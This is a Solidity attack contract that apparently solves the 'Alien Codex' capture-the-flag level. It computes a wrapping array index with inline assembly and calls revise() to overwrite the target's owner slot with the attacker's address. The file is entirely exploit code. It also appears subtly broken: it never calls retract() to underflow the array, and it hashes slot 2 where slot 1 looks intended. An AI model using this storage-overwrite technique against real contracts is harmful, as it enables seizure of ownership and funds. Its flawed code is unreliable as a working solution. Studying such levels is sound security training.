pragma solidity ^0.5.0;

interface IAlienCodex {
    function makeContact() external;
    function revise(uint i, bytes32 _content) external;
}

contract AlienCodexAttacker {
    address public player;

    constructor() public {
        player = msg.sender;
    }

    function exploit(address instanceAddress) public {
        IAlienCodex instance = IAlienCodex(instanceAddress);
        instance.makeContact();

        uint256 index;
        bytes32 codexArrayBase;
        assembly {
            mstore(0x00, 0x02)
            codexArrayBase := keccak256(0x00, 32)
            index := sub(0, codexArrayBase)
        }

        bytes32 content = bytes32(uint256(player));
        instance.revise(index, content);
    }
}